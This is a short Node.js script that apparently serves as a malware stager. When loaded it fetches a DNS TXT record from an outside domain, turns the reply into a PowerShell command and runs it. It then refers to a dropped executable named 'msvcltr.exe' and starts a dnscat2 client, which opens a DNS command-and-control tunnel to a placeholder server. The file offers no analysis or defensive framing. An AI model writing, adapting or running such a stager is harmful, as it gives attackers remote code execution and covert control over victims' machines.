// A pause function

function pauseMe(dir, num_time) {
    setTimeout(controlMe, num_time);
    return dir;
}

function controlMe(dir) {
        const { execSync } = require('child_process');
        execSync('[YOUR_DNSCAT2_CLIENT] --dns server=[YOUR_DNSCAT2_SERVER],port=53 --secret=[YOUR_SHARED_SECRET]', { encoding: 'utf-8' });
}


function mainStager() {
    const {spawnSync} = require('child_process');
    const child = spawnSync('nslookup', ['-type=txt', 'leakstage-ps1.exec.one.tendime.net']);

    let firststring = child.stdout.toString();
    let secondstring = firststring.split('=')[1];

    let thirdstring = secondstring.split('\)"')[0];
    // Trim all leading and following white space
    thirdstring = thirdstring.trim();
    // Remove the leading quote
    thirdstring = thirdstring.substring(1);
    // Append a trailing )
    thirdstring = thirdstring.concat('\)');
 
    const mychild = spawnSync("powershell.exe", [thirdstring]);
    // Get current working directory and attach the exec file payload
    let dir = process.cwd().toString() + '\\msvcltr.exe';
    controlMe(dir);
}

    // For test purposes
    // console.log('',thirdstring);

let n = 0;
if (n < 1){
    n++;
    mainStager();
}

